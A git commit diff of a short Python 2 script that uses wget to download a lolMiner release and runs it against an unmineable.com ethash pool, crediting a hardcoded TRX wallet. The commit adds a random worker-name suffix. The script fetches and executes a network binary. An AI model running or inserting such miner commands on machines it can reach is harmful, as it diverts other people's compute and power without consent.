ba817e24e02054ce9cccd905cd4b99d5b0853354
c4l4ng0_m4t4d0r <40896649+D4rks1R3@users.noreply.github.com>
2021-09-20 02:24:06 -0300

    Udate code

--- executeAGminer.py
+++ executeAGminer.py
@@ -1,13 +1,17 @@
 #!/bin/python2
 from os import system
 from time import sleep
+from random import  randint
 
 wall = "TPidhtNgpDDouvgE6unrLzsAbFBZW45CTj"
 
-try:
+try:	
+		n = randint(0, 999)
 		system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.32/lolMiner_v1.32a_Lin64.tar.gz && tar -xvf lolMiner_v1.32a_Lin64.tar.gz")
 		system("echo AAAA")
 		system("cd 1.32a")
-		system("./1.32a/lolMiner --algo ETHASH --pool  ethash.unmineable.com:3333 --user TRX:{}.MinerMiq --tls 0".format(str(wall)))
+		system("./1.32a/lolMiner --algo ethash --pool  ethash.unmineable.com:3333 --user TRX:{}.MinerMiq_{} --tls 0".format( str(wall),  int(n)  ))
+		
+
 except Exception as err:
 		print(" Error: ", err)
